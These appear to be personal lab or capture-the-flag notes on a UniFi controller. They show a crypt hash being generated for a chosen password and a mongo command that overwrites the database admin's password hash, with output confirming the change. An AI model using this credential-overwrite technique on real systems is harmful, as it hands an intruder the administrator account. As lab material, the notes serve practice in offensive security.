mkpasswd -m sha-512 12qwaszx!
$6$QosJcQDSZQwoHd.g$AXcHRGK29OHdWbAZuOhOlaC.AsotIg9Mlae9bhjuxmKxu8hwxyExR4ITg3VJ60hrXlPuGvWcGAo4P6BbOHYn1/



objectid of the db admin _id: 
ObjectId("61ce278f46e0fb0012d47ee4")


mongo update statement?
"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",


```
unifi@unified:/usr/lib/unifi/logs$ mongo --port 27117 ace --eval 'db.admin.updateOne({_id: ObjectId("61ce278f46e0fb0012d47ee4")}, {$set: {x_shadow: "$6$QosJcQDSZQwoHd.g$AXcHRGK29OHdWbAZuOhOlaC.AsotIg9Mlae9bhjuxmKxu8hwxyExR4ITg3VJ60hrXlPuGvWcGAo4P6BbOHYn1/"}})'
<xmKxu8hwxyExR4ITg3VJ60hrXlPuGvWcGAo4P6BbOHYn1/"}})'
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{ "acknowledged" : true, "matchedCount" : 1, "modifiedCount" : 1 }
```
